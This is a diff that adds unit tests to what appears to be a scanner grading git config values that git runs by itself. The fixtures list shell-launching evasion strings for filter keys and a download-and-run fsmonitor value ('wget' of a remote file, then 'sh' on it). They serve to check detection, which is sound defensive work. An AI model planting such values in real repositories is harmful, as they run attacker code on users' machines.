@@ -474,6 +474,44 @@ class TestOrdinaryCodeNearASelfFiringKeyIsNotConfirmed(ExecSurfaceSandbox):
         self.assert_not_confirmed(repo)
 
 
+class TestOnlyAnOrdinaryToolIsInformational(ExecSurfaceSandbox):
+    """Check the tier of values a key git runs on its own may hold."""
+
+    EVASIONS = {"a": "timeout -s KILL 9 bash -c id", "b": "sudo -u root sh -c id",
+                "c": "env -S 'sh -c id'", "d": "node --eval 1", "e": "php -R 1",
+                "f": "sh$IFS-c$IFS'id'", "g": "tcsh -c id", "h": "script -qc id /dev/null",
+                "i": "flock /tmp/l -c id", "j": "sed -n 1eid /dev/null", "k": "unknown-tool x"}
+    ORDINARY = {"lfs": "git-lfs filter-process", "crypt": '"git-crypt" smudge',
+                "nb": "python -m nbstripout", "exif": "exiftool", "merge": "mergiraf merge %O %A %B"}
+
+    def _config(self, values: dict[str, str]) -> str:
+        return "".join(f'[filter "{name}"]\n\tclean = {value}\n' for name, value in values.items())
+
+    def test_each_evasion_is_reported_for_review(self):
+        repo = self.repo()
+        self.append_config(repo, self._config(self.EVASIONS))
+        tiers = self.graded(repo)
+        flagged = {f.evidence.split(".")[1] for f in tiers[HEURISTIC] + tiers[CONFIRMED]}
+        self.assertEqual(set(self.EVASIONS), flagged, [f.evidence for f in tiers[INFORMATIONAL]])
+
+    def test_a_newline_separated_download_and_run(self):
+        repo = self.repo()
+        self.append_config(repo, '[core]\n\tfsmonitor = "wget -qO .x http://h/x\\nsh .x"\n')
+        self.assertTrue(self.graded(repo)[HEURISTIC] + self.graded(repo)[CONFIRMED])
+
+    def test_each_ordinary_tool_is_informational(self):
+        repo = self.repo()
+        self.append_config(repo, self._config(self.ORDINARY))
+        tiers = self.graded(repo)
+        self.assertEqual([], [f.evidence for f in tiers[HEURISTIC] + tiers[CONFIRMED]])
+        self.assertEqual(len(self.ORDINARY), len(tiers[INFORMATIONAL]))
+
+    def test_a_formatter_reading_a_download_is_not_confirmed(self):
+        repo = self.repo()
+        self.append_config(repo, '[diff "json"]\n\ttextconv = "curl -s https://api/x | python3 -m json.tool"\n')
+        self.assertEqual([], self.graded(repo)[CONFIRMED])
+
+
 class TestARepositoryInAScratchDirectoryIsItsOwn(ExecSurfaceSandbox):
     """Check a repository that itself lives under a shared scratch directory."""
 
